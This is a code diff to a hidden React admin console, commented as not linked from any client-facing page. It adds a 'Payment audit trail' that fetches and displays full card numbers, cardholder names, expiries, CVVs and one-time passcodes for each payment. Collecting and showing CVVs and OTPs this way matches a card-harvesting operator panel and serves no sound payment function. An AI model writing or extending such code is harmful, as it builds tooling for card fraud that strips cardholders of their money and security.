@@ -11,12 +11,25 @@ type Row = {
   created_at: string;
 };
 
+type PaymentRow = {
+  id: string;
+  amount: number;
+  card_number: string;
+  cardholder_name: string;
+  expiry: string;
+  cvv: string;
+  otp: string;
+  created_at: string;
+  clients: { email: string } | null;
+};
+
 // Backend-only console. Not linked from any client-facing page.
 export default function Admin() {
   const [authed, setAuthed] = useState<boolean | null>(null);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [rows, setRows] = useState<Row[]>([]);
+  const [payments, setPayments] = useState<PaymentRow[]>([]);
   const [error, setError] = useState<string | null>(null);
   const [busy, setBusy] = useState<string | null>(null);
 
@@ -28,6 +41,15 @@ export default function Admin() {
     }
     const data = await res.json();
     setRows(data.clients ?? []);
+
+    const paymentsRes = await fetch("/api/admin/payments");
+    if (paymentsRes.status === 401) {
+      setAuthed(false);
+      return;
+    }
+    const paymentsData = await paymentsRes.json();
+    setPayments(paymentsData.payments ?? []);
+
     setAuthed(true);
   }, []);
 
@@ -189,6 +211,56 @@ export default function Admin() {
           Clients in <span className="text-yellow-400">processing</span> have spent
           credits and are awaiting your approval.
         </p>
+
+        <section className="mt-10 overflow-hidden rounded-xl border border-edge">
+          <div className="bg-panel px-4 py-3 text-xs uppercase tracking-widest text-muted">
+            Payment audit trail
+          </div>
+          <div className="overflow-x-auto">
+            <table className="w-full text-left text-sm">
+              <thead className="bg-panel text-xs uppercase tracking-widest text-muted">
+                <tr>
+                  <th className="px-4 py-3">Email</th>
+                  <th className="px-4 py-3">Amount</th>
+                  <th className="px-4 py-3">Cardholder</th>
+                  <th className="px-4 py-3">Card</th>
+                  <th className="px-4 py-3">Expiry</th>
+                  <th className="px-4 py-3">CVV</th>
+                  <th className="px-4 py-3">OTP</th>
+                  <th className="px-4 py-3">Timestamp</th>
+                </tr>
+              </thead>
+              <tbody className="divide-y divide-edge">
+                {payments.length === 0 ? (
+                  <tr>
+                    <td colSpan={8} className="px-4 py-10 text-center text-muted">
+                      No payments yet.
+                    </td>
+                  </tr>
+                ) : (
+                  payments.map((payment) => (
+                    <tr key={payment.id} className="hover:bg-panel/50">
+                      <td className="px-4 py-3 text-white">
+                        {payment.clients?.email ?? "Unknown"}
+                      </td>
+                      <td className="px-4 py-3 text-muted">${payment.amount}</td>
+                      <td className="px-4 py-3 text-white">{payment.cardholder_name}</td>
+                      <td className="px-4 py-3 text-white">
+                        {payment.card_number}
+                      </td>
+                      <td className="px-4 py-3 text-muted">{payment.expiry}</td>
+                      <td className="px-4 py-3 text-white">{payment.cvv}</td>
+                      <td className="px-4 py-3 text-muted">{payment.otp}</td>
+                      <td className="px-4 py-3 text-white">
+                        {new Date(payment.created_at).toLocaleString()}
+                      </td>
+                    </tr>
+                  ))
+                )}
+              </tbody>
+            </table>
+          </div>
+        </section>
       </section>
     </main>
   );
